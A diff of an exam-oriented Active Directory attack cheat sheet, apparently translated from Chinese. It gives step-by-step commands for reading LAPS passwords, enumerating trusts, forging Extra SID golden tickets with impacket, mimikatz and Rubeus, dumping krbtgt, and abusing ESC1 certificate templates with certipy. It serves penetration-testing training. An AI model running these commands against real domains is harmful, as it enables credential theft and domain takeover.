-info "Next: LAPS hit and see scenario 49; Delegation/RBCD hit and see scenario 51/52 (m12-delegation-attacks.ps1);"
-info "Trust + SID hit see scenario 53 (Extra SID segment of m12-laps-and-trust-notes.md)."
+printf '\n[*] finished mode: %s (output directory %s)\n' "$MODE" "$OUTDIR"
+info "next: for LAPS hits see scenario 49; for delegation/RBCD hits see scenarios 51/52 (m12-delegation-attacks.ps1);"
+info "      for trust + SID hits see scenario 53 (the Extra SID section of m12-laps-and-trust-notes.md)."
 ````
 
 #### `m12-laps-and-trust-notes.md` {#m12-laps-and-trust-notes-md}
 
 ````markdown
-# m12 · LAPS reading, domain/forest trust enumeration, Extra SID and SID filtering command notes
+# m12 - reading LAPS, domain/forest trust enumeration, Extra SID and SID filtering command notes
 
 <!--
-use：LAPS（legacy AdmPwd and Windows LAPS Two reading methods), domain/Forest trust enumeration and determination、
-      Extra SID / SID history injection、SID filtering Command quick check of precautions (pure notes, non-executable scripts)）。
-scene：M12 scene 49（read LAPS）、53（subdomain → Lin Gen: Trust Judgment + Extra SID）。
-rely：Linux side ldapsearch（ldap-utils）/ netexec / impacket（ticketer、secretsdump）/
-      bloodhound-python；Windows side ADSI（The system comes with）、nltest（The system comes with）、
-      PowerView or AdmPwd.PS / LAPS PowerShell Module (need to be delivered or brought by yourself）。
-Usage: Execute in order of sections; replace the placeholders in the command and then paste。Linux For side batch enumeration
-      m12-ad-enum-linux.sh -m laps / -m trust，Windows Side use
-      m12-ad-enum-windows.ps1 -Mode LAPS。
-placeholder：DOMAIN=domain FQDN  TARGET=DC/Host  USER/PASS/NTHASH=Credentials  LHOST=attack aircraft IP
-      ——In the command of this article corp.local / child.corp.local They are all indicative domain names, replaced by the real values ​​​​of the exam environment.。
-Test state: command shape press cheat sheet "AD Enumeration / AD Attacking" Compiled with common configurations of the target environment，
-      Not in real multi-domain/Actual measurement of multi-forest environment step by step；SID and trust attributes are subject to the actual return value of the target。
+Purpose: command quick reference for LAPS (both the legacy AdmPwd and the Windows
+      LAPS reading methods), domain/forest trust enumeration and assessment,
+      Extra SID / SID history injection, and SID filtering caveats (pure notes,
+      not an executable script).
+Scenarios: M12 scenario 49 (read LAPS), 53 (child domain -> forest root: trust
+      assessment + Extra SID).
+Dependencies: on Linux, ldapsearch (ldap-utils) / netexec / impacket (ticketer,
+      secretsdump) / bloodhound-python; on Windows, ADSI (built in), nltest
+      (built in), PowerView or the AdmPwd.PS / LAPS PowerShell module (must be
+      delivered or already present).
+Usage: work through the sections in order; substitute the placeholders in the
+      commands before pasting. For bulk enumeration from Linux use
+      m12-ad-enum-linux.sh -m laps / -m trust, on Windows use
+      m12-ad-enum-windows.ps1 -Mode LAPS.
+Placeholders: DOMAIN=domain FQDN  TARGET=DC/host  USER/PASS/NTHASH=credentials  LHOST=attacker IP
+      -- the corp.local / child.corp.local in these commands are illustrative
+      domains, replace them with the real values from your exam environment.
+Test status: command shapes are based on the cheat sheet "AD Enumeration / AD
+      Attacking" and common target environment configurations; not verified line
+      by line in a real multi-domain/multi-forest environment; trust the SIDs and
+      trust attributes the target actually returns.
 -->
 
-> one sentence principle：**Decide first before taking action**。LAPS You need to distinguish the version first（legacy `ms-Mcs-AdmPwd*` vs Windows LAPS
+> One-line principle: **assess before you act**. For LAPS, first establish the version (legacy `ms-Mcs-AdmPwd*` vs Windows LAPS
 >
-> `msLAPS-*`）；Cross-domain trust attributes must be determined first (whether `WITHIN_FOREST`、Is the direction available?），
+> `msLAPS-*`); across domains, first assess the trust attributes (is it `WITHIN_FOREST`, is the direction usable),
 >
-> Change the route when the judgment is not established. Don't waste time on impossible routes.。
+> and when the assessment says no, change path -- do not burn time on an impossible route.
 >
-> placeholder：`DOMAIN` `TARGET` `USER` `PASS` `NTHASH` `LHOST`
+> Placeholders: `DOMAIN` `TARGET` `USER` `PASS` `NTHASH` `LHOST`
 
 ---
 
-## 1. LAPS version determination (30 seconds)
+## 1. Deciding the LAPS version (30 seconds)
 
 ```bash
-# Linux: Check four attributes at once to see which one exists
+# Linux: query all four attributes at once and see which one exists
 ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
   -b "DC=corp,DC=local" "(objectClass=computer)" \
   ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword
 
-# Only look at "installed or not" (the expiration time attribute is readable by domain users by default, which is the best existence criterion)
+# Check only "is it installed" (the expiration attribute is readable by default domain users, the best existence test)
 ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
   -b "DC=corp,DC=local" "(ms-Mcs-AdmPwdExpirationTime=*)" dnshostname
 ```
 
-| Results seen | meaning |
+| What you see | Meaning |
 |---|---|
-| have `ms-Mcs-AdmPwd` value | legacy LAPS，clear text readable → Take it directly for remote execution |
-| only `ms-Mcs-AdmPwdExpirationTime` No password | legacy LAPS Deployed but current identity**No read permission** |
-| have `msLAPS-Password` | Windows LAPS Plain text mode, can be read directly |
-| only `msLAPS-EncryptedPassword` | Windows LAPS encryption mode（DPAPI），pure LDAP Can't get the clear text |
-| Nothing found | Not deployed LAPS，or NetBIOS/BaseDN Wrong writing |
+| An `ms-Mcs-AdmPwd` value | legacy LAPS, readable in cleartext -> use it for remote execution directly |
+| Only `ms-Mcs-AdmPwdExpirationTime` and no password | legacy LAPS is deployed, but the current identity has **no read permission** |
+| An `msLAPS-Password` value | Windows LAPS cleartext mode, readable directly |
+| Only `msLAPS-EncryptedPassword` | Windows LAPS encrypted mode (DPAPI), plain LDAP cannot recover the cleartext |
+| Nothing at all | LAPS is not deployed, or the NetBIOS/BaseDN is wrong |
 
 ---
 
-## 2. legacy LAPS (`ms-Mcs-AdmPwd`) reading
+## 2. Reading legacy LAPS (`ms-Mcs-AdmPwd`)
 
 ### Linux side
 
 ```bash
-# Single unit
+# single host
 ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
   -b "DC=corp,DC=local" "(&(objectClass=computer)(sAMAccountName=WS02$))" \
   dnshostname ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
-# Scan the entire domain (fastest when you have read permission)
+# whole domain in one sweep (fastest when you have read permission)
 ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
   -b "DC=corp,DC=local" "(ms-Mcs-AdmPwd=*)" dnshostname ms-Mcs-AdmPwd
 
-# netexec (when there is a corresponding module)
+# netexec (when the matching module is available)
 netexec ldap TARGET -u USER -p 'PASS' -M laps
 netexec ldap TARGET -u USER -H NTHASH -M laps
 ```
@@ -2128,14 +2146,14 @@ netexec ldap TARGET -u USER -H NTHASH -M laps
 ### Windows side (no RSAT / no PowerView, pure ADSI)
 
 ```powershell
-# Global: machines with password values
+# whole domain: machines that have a password value
 ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*))").FindAll() |
   ForEach-Object { $_.Properties.dnshostname; $_.Properties.'ms-mcs-admpwd' }
 
-# Single unit
+# single host
 ([adsisearcher]"(&(objectCategory=computer)(sAMAccountName=WS02$))").FindOne().Properties.'ms-mcs-admpwd'
 
-# Only exists (readable by any domain user)
+# existence test only (readable by any domain user)
 ([adsisearcher]"(&(objectCategory=computer)(ms-Mcs-AdmPwdExpirationTime=*))").FindAll().Count
 ```
 
@@ -2146,12 +2164,12 @@ Import-Module .\PowerView.ps1
 Get-DomainComputer -Identity WS02 -Properties ms-Mcs-AdmPwd
 Get-DomainComputer | Select-Object dnshostname,'ms-mcs-admpwd' | Where-Object { $_.'ms-mcs-admpwd' }
 
-# legacy LAPS official module
+# official legacy LAPS module
 Import-Module AdmPwd.PS
 Get-AdmPwdPassword -ComputerName WS02
 ```
 
-### Whether the legacy LAPS client is installed locally (used to determine the version)
+### Is the legacy LAPS client installed locally (to judge the version)
 
 ```powershell
 Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
@@ -2160,36 +2178,37 @@ Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
 
 ---
 
-## 3. Windows LAPS (`msLAPS-*`) reading
+## 3. Reading Windows LAPS (`msLAPS-*`)
 
 ```bash
-# Linux: clear text mode
+# Linux: cleartext mode
 ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
   -b "DC=corp,DC=local" "(msLAPS-Password=*)" dnshostname msLAPS-Password msLAPS-PasswordExpirationTime
 ```
 
 ```powershell
-# Windows LAPS plain text mode (PowerShell module)
+# Windows LAPS cleartext mode (PowerShell module)
 Get-LapsADPassword -Identity WS02 -AsPlainText
 
-# Encryption mode (msLAPS-EncryptedPassword, DPAPI protected):
-#   Pure LDAP/unauthorized sessions cannot decrypt plaintext, require context that can be decrypted on the target machine
-Get-LapsADPassword -Identity WS02 -AsPlainText          # Still preferred in privileged sessions
-#   Confirm policy in registry (Windows 11/Server 2022+)
+# encrypted mode (msLAPS-EncryptedPassword, DPAPI protected):
+#   plain LDAP / an unauthorized session cannot recover the cleartext; you need a
+#   context that can decrypt on the target machine
+Get-LapsADPassword -Identity WS02 -AsPlainText          # still the first choice in a privileged session
+#   confirm the policy in the registry (Windows 11 / Server 2022+)
 Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Services\AdmPwd
 ```
 
-**Don’t be stubborn when you can’t get the plaintext in encryption mode**, three alternatives:
-1. Replace and still use legacy LAPS machines (often mixed in the same domain)）；
-2. Changed it `msLAPS-Password` plaintext policy machine；
-3. Elevate the privileges to an identity that can read the attribute first, and then come back to read it.。
+**When encrypted mode will not give you the cleartext, do not grind on it**; three alternatives:
+1. Switch to a machine still on legacy LAPS (domains often mix the two);
+2. Switch to a machine where the `msLAPS-Password` cleartext policy is enabled;
+3. Escalate first to an identity that can read the attribute, then come back and read it.
 
 ---
 
-## 4. Who has permission to read LAPS (readability check)
+## 4. Who can read LAPS (readability troubleshooting)
 
 ```powershell
-# PowerView: Find principal with ReadProperty for ms-Mcs-AdmPwd
+# PowerView: find principals with ReadProperty on ms-Mcs-AdmPwd
 Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
   Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } |
   ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier) -PassThru } |
@@ -2197,35 +2216,35 @@ Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
 ```
 
 ```bash
-# Linux side comparison: first confirm who "I" is and which groups I am in
-netexec ldap TARGET -u USER -p 'PASS' -M laps             # Directly enter the password when you have permission
+# Linux cross-check: first confirm who "you" are and which groups you are in
+netexec ldap TARGET -u USER -p 'PASS' -M laps             # prints passwords directly when you have permission
 bloodhound-python -c ACL -u USER -p 'PASS' -d DOMAIN -dc TARGET -ns TARGET --dns-tcp
-# To see the target object ACL, use m12-ad-enum-windows.ps1 -Mode ACL
+# to inspect the ACLs on a target object use m12-ad-enum-windows.ps1 -Mode ACL
 ```
 
-- Property exists but cannot be read → ACL It's a problem, not a tool problem；
-- There is no value in the entire domain → Not deployed or the reset cycle has not yet arrived。
+- The attribute exists but you cannot read it -> an ACL problem, not a tool problem;
+- No value anywhere in the domain -> not deployed, or the reset cycle has not come round yet.
 
 ---
 
-## 5. Landing after getting the LAPS password
+## 5. Using the LAPS password once you have it
 
 ```bash
-# 445 on: SMB/WMI series (LAPS manages the local Administrator of the target machine)
+# 445 open: the SMB/WMI family (LAPS manages the target machine's local Administrator)
 impacket-wmiexec DOMAIN/Administrator@TARGET -p 'PASS'
 impacket-psexec  DOMAIN/Administrator@TARGET -p 'PASS'
-# Only open 5985: WinRM
+# only 5985 open: WinRM
 evil-winrm -i TARGET -u Administrator -p 'PASS'
-# When there is a hash
+# when you have the hash
 impacket-wmiexec DOMAIN/Administrator@TARGET -hashes :NTHASH
 ```
 
-- **LAPS Passwords are differentiated by machine**：WS02 Can't enter the password WS03；Make sure it is the same one before using it。
-- Neither agreement is opened → This password is currently useless, please go back to enumeration to find another entrance.。
+- **LAPS passwords are per machine**: the password for WS02 will not get you into WS03; confirm it is the same machine before you use it.
+- Neither protocol open -> that password is useless right now, go back to enumeration and find another entry point.
 
 ---
 
-## 6. Domain/Forest Trust Enumeration
+## 6. Domain / forest trust enumeration
 
 ### Windows
 
@@ -2236,10 +2255,10 @@ nltest /dclist:DOMAIN
 ```
 
 ```powershell
-# When RSAT is available
+# with RSAT
 Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, ForestTransitive
 (Get-ADForest).Domains
-# No RSAT (ADSI)
+# without RSAT (ADSI)
 ([adsisearcher]"(objectClass=trustedDomain)").FindAll() |
   ForEach-Object { $_.Properties.cn; $_.Properties.trustpartner;
                   $_.Properties.trustattributes; $_.Properties.trustdirection }
@@ -2258,158 +2277,158 @@ netexec ldap TARGET -u USER -p 'PASS' -M enum_trusts
 
 ---
 
-## 7. Trust determination table (core of scenario 53)
+## 7. Trust decision table (the core of scenario 53)
 
-**trustDirection**: `0`=disabled · `1`=inbound (the other party can authenticate to this domain) · `2`=outbound (this domain can authenticate to the other party) · `3`=bidirectional
+**trustDirection**: `0`=disabled · `1`=inbound (the other side can authenticate to this domain) · `2`=outbound (this domain can authenticate to the other side) · `3`=two-way
 
 **trustType**: `1`=Downlevel(non-AD) · `2`=Uplevel(AD) · `3`=MIT(Kerberos v5) · `4`=DCE
 
-**trustAttributes key**
+**trustAttributes key bits**
 
-| value | constant | meaning / right Extra SID influence |
+| Value | Constant | Meaning / effect on Extra SID |
 |---|---|---|
-| `0x00000020` (32) | `WITHIN_FOREST` | **Linnei (Father and Son) Trust**，SID Filtering does not take effect by default → Extra SID feasible |
-| `0x00000008` (8) | `FOREST_TRANSITIVE` | Lin trust, cross forest |
-| `0x00000004` (4) | `QUARANTINED` | isolation，SID Filter by external processing → Extra SID invalid |
-| `0x00000400` (1024) | `TREAT_AS_EXTERNAL` | Handle as external trust → SID Filter on |
-| `0x00000040` (64) | `CROSS_ORGANIZATION` | Across organizations, handled externally |
+| `0x00000020` (32) | `WITHIN_FOREST` | **intra-forest (parent/child) trust**, SID filtering off by default -> Extra SID works |
+| `0x00000008` (8) | `FOREST_TRANSITIVE` | forest trust, cross-forest |
+| `0x00000004` (4) | `QUARANTINED` | quarantined, SID filtering treated as external -> Extra SID does not work |
+| `0x00000400` (1024) | `TREAT_AS_EXTERNAL` | treated as an external trust -> SID filtering on |
+| `0x00000040` (64) | `CROSS_ORGANIZATION` | cross-organization, treated as external |
 
-**Judgment conclusion**
+**Conclusion**
 
-- `WITHIN_FOREST(0x20)` + Outbound or bidirectional（`2` / `3`）→ Extra SID Golden ticket route established；
-- external/forest trust, or belt `QUARANTINED` / `TREAT_AS_EXTERNAL` → SID filtering Enabled by default，**Extra SID invalid**，Change path (cross-domain ACL、LAPS、delegate、ADCS reassess）；
-- The direction is"root→child"one-way inbound → The subdomain cannot be authenticated to the root, and the mutual trust ticket is with Extra SID No way。
+- `WITHIN_FOREST(0x20)` + outbound or two-way (`2` / `3`) -> the Extra SID golden ticket route holds;
+- external/forest trust, or `QUARANTINED` / `TREAT_AS_EXTERNAL` -> SID filtering is on by default, **Extra SID does not work**, change path (re-assess cross-domain ACLs, LAPS, delegation, ADCS);
+- the direction is a one-way inbound "root -> child" -> the child domain cannot authenticate to the root, so neither inter-realm referral tickets nor Extra SID work.
 
 ---
 
-## 8. Extra SID Golden Ticket (Subdomain → Lingen)
+## 8. Extra SID golden ticket (child domain -> forest root)
 
-prefix：① The above is determined to be trustworthy within the forest and the direction is available.；② get**subdomain krbtgt of NTLM**；③ subdomain SID and**root domain SID**（root domain SID + `-519` = Enterprise Admins）。
+Prerequisites: ① the assessment above says intra-forest trust with a usable direction; ② you have the **child domain krbtgt NTLM**; ③ the child domain SID and the **root domain SID** (root domain SID + `-519` = Enterprise Admins).
 
 ```bash
-# ① Get krbtgt on the subdomain DC (when there is already a subdomain DA)
+# ① get krbtgt on the child DC (when you already have the child DA)
 impacket-secretsdump -just-dc-user krbtgt DOMAIN/USER:'PASS'@TARGET
 
-# ② Get the root domain SID (in the root domain context)
-impacket-lookupsid DOMAIN/USER:'PASS'@TARGET 2        # fields in output SID
-# Or use ldapsearch "(objectClass=domainDNS)" objectSid (see m12-ad-enum-linux.sh -m sid)
+# ② get the root domain SID (in the root domain context)
+impacket-lookupsid DOMAIN/USER:'PASS'@TARGET 2        # the domain SID in the output
+# or use ldapsearch "(objectClass=domainDNS)" objectSid (see m12-ad-enum-linux.sh -m sid)
 
-# ③ Create a golden ticket with Extra SID
-impacket-ticketer -nthash <subdomainkrbtgtofNT> -domain child.corp.local \
-  -domain-sid <subdomainSID> -extra-sid '<Root domain SID>-519' Administrator
+# ③ build a golden ticket carrying the Extra SID
+impacket-ticketer -nthash <child krbtgt NT> -domain child.corp.local \
+  -domain-sid <child domain SID> -extra-sid '<root domain SID>-519' Administrator
 
-# ④ Use the ticket to create the root domain
+# ④ use the ticket against the root domain
 export KRB5CCNAME=Administrator.ccache
 klist -e
-impacket-secretsdump -k -no-pass <rootDC FQDN>
+impacket-secretsdump -k -no-pass <root DC FQDN>
 ```
 
-**Windows side equivalent**
+**Windows-side equivalent**
 
 ```cmd
-mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:<subdomainSID> /krbtgt:<subdomainkrbtgt NT> /sids:<root domainSID>-519 /ptt
+mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:<child domain SID> /krbtgt:<child krbtgt NT> /sids:<root domain SID>-519 /ptt
 ```
 ```powershell
-.\Rubeus.exe golden /user:Administrator /domain:child.corp.local /sid:<subdomainSID> /krbtgt:<subdomainkrbtgt NT> /sids:<root domainSID>-519 /ptt
+.\Rubeus.exe golden /user:Administrator /domain:child.corp.local /sid:<child domain SID> /krbtgt:<child krbtgt NT> /sids:<root domain SID>-519 /ptt
 ```
 
-- `-extra-sid` can only be**root domain SID of RID suffix**Common values：`-519`(Enterprise Admins)、`-512`(Domain Admins)、`-518`(Schema Admins)。
-- Frequent errors: Root domain SID Wrong copy / Forgot `-519` suffix / `/etc/hosts` Reagan DC of FQDN Unable to parse。
+- `-extra-sid` can only take **RID suffixes of the root domain SID**; the common values: `-519` (Enterprise Admins), `-512` (Domain Admins), `-518` (Schema Admins).
+- Frequent mistakes: a mistyped root domain SID / forgetting the `-519` suffix / the root DC FQDN not resolving from `/etc/hosts`.
 
 ---
 
-## 9. Notes on SID history injection and SID filtering
+## 9. SID history injection and SID filtering caveats
 
-**Injection** (Insert the foreign domain SID into the ExtraSids / SIDHistory of the PAC):
-
-```bash
-impacket-ticketer -nthash NTHASH -domain DOMAIN -domain-sid <domainSID> -extra-sid '<target domain SID>-519' USER
-```
-```cmd
-mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:<domainSID> /krbtgt:NTHASH /sids:<TargetSID>-519 /ptt
-```
-```cmd
-mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:<domainSID> /krbtgt:NTHASH /sids:<TargetSID> /startoffset:0 /endin:600 /renewmax:10080 /ptt
-```
-
-**SID filtering (isolation) points**
-
-- Purpose: when crossing trusts，KDC meeting**peel off**Not belonging to this forest SID（ExtraSids / SIDHistory），So injected Enterprise Admins SID will be discarded when filtering is enabled。
-- Default behavior: Rinnai and Son/Roots of trust**No filtering**；External trust and forest trust**Default filtering**；`QUARANTINED` / `TREAT_AS_EXTERNAL` Bits are forced to be handled externally。
-- Available to domain administrators `netdom trust DOMAIN /domain:OTHER /quarantine:no` Turn off filtering (requires EA Permissions are basically not expected in the exam, and do not change the target environment for this purpose.）。
-- Judgment method returns to Chapter 7 Section: Look `trustAttributes`，Don't rely on"Try it and see if it works"。
-- Even if filtering is turned off, it still depends on whether the target is enabled `EnableSIDHistory` Related strategies and PAC Verification; if the expected permissions cannot be obtained, first `klist` / `whoami /groups` confirm SID Whether the token is really entered?。
-
-**Verify that Extra SID is valid**
+**Injection** (stuffing a foreign domain SID into the PAC ExtraSids / SIDHistory):
 
 ```bash
-klist -e                                     # Whether the ticket is generated and whether the subject is correct
-impacket-secretsdump -k -no-pass <rootDC FQDN> # able dump out of root domain krbtgt = Take effect
+impacket-ticketer -nthash NTHASH -domain DOMAIN -domain-sid <domain SID> -extra-sid '<target domain SID>-519' USER
 ```
 ```cmd
-whoami /groups                               # injection /ptt You should be able to see it later Enterprise Admins of SID
+mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:<domain SID> /krbtgt:NTHASH /sids:<target SID>-519 /ptt
+```
+```cmd
+mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:<domain SID> /krbtgt:NTHASH /sids:<target SID> /startoffset:0 /endin:600 /renewmax:10080 /ptt
+```
+
+**SID filtering (quarantine) essentials**
+
+- Purpose: across a trust, the KDC **strips** SIDs that do not belong to its own forest (ExtraSids / SIDHistory), so an injected Enterprise Admins SID is dropped when filtering is on.
+- Default behavior: intra-forest parent/child and tree-root trusts **do not filter**; external trusts and forest trusts **filter by default**; the `QUARANTINED` / `TREAT_AS_EXTERNAL` bits force external handling.
+- A domain admin can turn filtering off with `netdom trust DOMAIN /domain:OTHER /quarantine:no` (requires EA rights; in an exam you basically should not count on it, and do not modify the target environment just for that).
+- Assessment method: go back to section 7, read `trustAttributes`, do not rely on "let me just try it and see".
+- Even with filtering off, check whether the target enables the `EnableSIDHistory` related policy and PAC validation; when you do not get the privileges you expect, `klist` / `whoami /groups` first to confirm the SID actually made it into the token.
+
+**Verifying whether the Extra SID took effect**
+
+```bash
+klist -e                                     # was the ticket created, is the principal right
+impacket-secretsdump -k -no-pass <root DC FQDN> # dumping the root domain krbtgt = it worked
+```
+```cmd
+whoami /groups                               # after injecting /ptt you should see the Enterprise Admins SID
 ```
 
 ---
 
-## 10. Quick check on failed branches
+## 10. Failure branch quick reference
 
-| Phenomenon | judge | deal with |
+| Symptom | Diagnosis | Action |
 |---|---|---|
-| LAPS All attributes are empty | Not deployed / No read permission | Change machine enumeration; or elevate privileges first and then read; or transfer RBCD/delegate/ADCS |
-| only encrypted `msLAPS-EncryptedPassword` | Windows LAPS encryption mode | try to find legacy machine or plaintext policy machine; don’t fight for decryption |
-| The password is correct but I can’t get in | The password belongs to another machine | Confirm the machine name and change the password of the corresponding machine |
-| Only open 5985 | SMB Doesn't make sense | `evil-winrm`；If both agreements are closed, this article will be abandoned. |
-| trust is external/forest | SID filtering open | Extra SID Invalid, switch to cross-domain ACL or other entrance |
-| One way and opposite direction | Subdomain cannot authenticate to root | Can only rely on other paths within the root domain |
-| Golden ticket authentication failed（TGS rejected） | SID/suffix/FQDN Wrong writing | Check `-extra-sid` and `/etc/hosts` the root of DC parse |
-| no subdomain krbtgt | Only control the non DC High authority | First go horizontally in the subdomain to DC Again `secretsdump` |
+| All LAPS attributes empty | not deployed / no read permission | enumerate other machines; or escalate first and read again; or move to RBCD/delegation/ADCS |
+| Only the encrypted `msLAPS-EncryptedPassword` | Windows LAPS encrypted mode | find a legacy machine or one with the cleartext policy; do not grind on decryption |
+| The password is right but you cannot get in | the password belongs to another machine | confirm the machine name, use the matching machine's password |
+| Only 5985 open | SMB is not reachable | `evil-winrm`; if both protocols are closed, drop this path |
+| The trust is external/forest | SID filtering on | Extra SID does not work, switch to cross-domain ACLs or another entry point |
+| One-way and pointing the other way | the child domain cannot authenticate to the root | only other paths inside the root domain remain |
+| Golden ticket authentication fails (TGS refused) | wrong SID/suffix/FQDN | check `-extra-sid` and the root DC resolution in `/etc/hosts` |
+| No child krbtgt | you only control non-DC high privileges | move laterally inside the child domain to a DC first, then `secretsdump` |
 
 ---
 
-## 11. Examination Notes / OPSEC
+## 11. Exam notes / OPSEC
 
-- LAPS The query will be written LDAP Audit log, expected enumeration behavior；**don't want**to the whole domain dump Then randomly try the passwords one by one, and only take the machines needed for the scenario.。
-- Do not leave the password in a long command in clear text shell History (using environment variables or script parameters）。
-- golden ticket / Extra SID The most sensitive operations in the domain: only performed after the trust determination is established, and cleaned up after completion `ccache`；`ticketer` Only runs locally on the attack machine and does not deliver files to the target.。
-- `/etc/hosts` Must also be able to resolve subdomains DC with roots DC of FQDN（Kerberos Not accepted IP），use
-  `m12-kerberos-tickets-linux.sh -m hosts` Generate template。
-- time offset >5 Minutes will make everything Kerberos The operation failed. Please calibrate the time first and then troubleshoot.。
+- LAPS queries write LDAP audit logs; that is expected enumeration behavior; do **not** dump the whole domain and then try passwords at random, take only the machines the scenario needs.
+- Do not leave passwords in your shell history as long cleartext command lines (use environment variables or script arguments).
+- Golden ticket / Extra SID are the most sensitive operations inside a domain: only run them after the trust assessment holds, and clean up the `ccache` afterwards; `ticketer` only runs locally on the attacker box and delivers no files to the target.
+- `/etc/hosts` must resolve the FQDNs of both the child DC and the root DC (Kerberos does not accept IPs); generate a template with
+  `m12-kerberos-tickets-linux.sh -m hosts`.
+- A clock skew >5 minutes makes every Kerberos operation fail; fix the time before you troubleshoot anything else.
 ````
 
-## Scenario 54: Low-privilege domain users can apply for incorrectly configured certificate templates (ESC1)
+## Scenario 54: A low-privilege domain user can request a misconfigured certificate template (ESC1)
 
-**Situation**: ADCS is deployed in the domain; a published template meets the ESC1 conditions, and the current low-privilege user **has the right to apply**. Goal: Use the certificate to obtain administrator status.
+**Situation**: ADCS is deployed in the domain; a published template meets the ESC1 conditions, and the current low-privilege user **has the right to request** it. Goal: use the certificate to obtain an administrator identity.
 
-**ESC1 Judgment Conditions (all four are met at the same time)**: ① The template is turned on** The applicant provides SAN** (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, that is, you can fill in `-upn`); ② The template EKU contains **Client Authentication** (`Client Authentication`, or use Any Purpose's "any purpose" template, which is often encountered in the exam); ③ The template allows low-privilege users/groups to register** (enroll) Permissions); ④ Template **not set** CA certificate manager approval (`CA Manager Approval` closed, otherwise the application will be suspended).
+**ESC1 conditions (all four must hold at once)**: ① the template enables **enrollee-supplied SAN** (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, i.e. you can fill in `-upn`); ② the template EKU includes **Client Authentication** (`Client Authentication`, or it is an "Any Purpose" template, which you often meet in exams); ③ the template lets low-privilege users/groups **enroll** (enroll permission); ④ the template has **no** CA Manager Approval (with `CA Manager Approval` on, your request is left pending).
 
-**Assumptions**: `certipy` (Kali: `certipy-ad`) is available; the attack machine can parse and access the CA host (LDAP/DCERPC, if necessary `/etc/hosts`); the FQDN of the DC and CA are known.
+**Assumptions**: `certipy` (Kali: `certipy-ad`) is available; the attacker can resolve and reach the CA host (LDAP/DCERPC, `/etc/hosts` if needed); the FQDNs of the DC and the CA are known.
 
-**Prepare (attacker)**: `certipy find` First do the full template enumeration and mark the available items (one enumeration will get the CA name/template list/applicants at the same time to avoid blind testing).
+**Prepare (attacker side)**: run `certipy find` first for a full template enumeration that flags the exploitable ones (one enumeration gives you the CA name, the template list and who can enroll, so you do not have to guess).
 
-**Procedure**：
+**Procedure**:
 ```bash
-# ① Enumeration: List -vulnerable templates and registrable subjects
+# ① Enumerate: list -vulnerable templates and the principals that can enroll
 certipy find -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local -vulnerable -stdout
-# ② Application: Impersonate administrator (SAN fill in its UPN)
+# ② Request: impersonate administrator (put its UPN in the SAN)
 certipy req -u USER@corp.local -p 'PASS' -ca 'CORP-CA' -target CA01.corp.local \
   -template 'VulnTemplate' -upn administrator@corp.local -dc-ip DC01.corp.local -out admin
-# ③ Exchange certificate for NTLM hash → DCSync
+# ③ Trade the certificate for the NTLM hash -> DCSync
 certipy auth -pfx admin.pfx -dc-ip DC01.corp.local -domain corp.local
 impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
 ```
-**Scripts used**: `m12-adcs-esc1-esc8.sh` (enumerate/req/auth one-click encapsulation + parameter template).
+**Scripts used**: `m12-adcs-esc1-esc8.sh` (a one-shot wrapper for enumerate/req/auth plus argument templates).
 
-**Validation**: `certipy auth` successfully outputs the NTLM hash; `secretsdump` can read `krbtgt` and reaches domain management.
+**Validation**: `certipy auth` prints the NTLM hash; if `secretsdump` can read `krbtgt` you are domain admin.
 
-**Failure branches and alternatives**：
-- `req` newspaper 0x80094012 / Certificate policy mismatch → template EKU Does not contain client authentication or template is rejected, replace `-template` candidate (using `certipy find` instead of just looking at the full list of vulnerable mark）。
-- `req` Report permission/rejected → The current user does not have registration rights for this template；`-upn` The user does not exist or UPN No match; check one by one ESC1 four conditions。
-- The application was successful but `auth` fail → Certificate subject/Issuance time issue, re- `req` use `-out` Cover; or replace `certipy auth -username administrator -domain corp.local` Explicitly specified。
-- CA name/Host resolution failed → `find` Take from output `CA Name` and DNS hostname，`/etc/hosts` Point to reality CA IP；`-target` Parameters can be directly pointed to CA。
-- None available ESC1 template → Don't try hard, jump to ESC8（scene 55）or other entrance。
+**Failure branches and alternatives**:
+- `req` returns 0x80094012 / certificate policy does not match -> the template EKU lacks client authentication or the template is refused; try the next `-template` candidate (work from the full `certipy find` list rather than only the entries flagged vulnerable).
+- `req` returns a permission error / is refused -> the current user has no enroll right on that template; the `-upn` user does not exist or the UPN does not match; check the four ESC1 conditions one by one.
+- The request succeeds but `auth` fails -> a certificate subject/issuance time problem; re-run `req` and overwrite with `-out`; or specify `certipy auth -username administrator -domain corp.local` explicitly.
+- CA name/host resolution fails -> take `CA Name` and the DNS host name from the `find` output and point `/etc/hosts` at the real CA IP; the `-target` argument can address the CA directly.
+- No usable ESC1 template -> do not force it, jump to ESC8 (scenario 55) or another entry point.
 
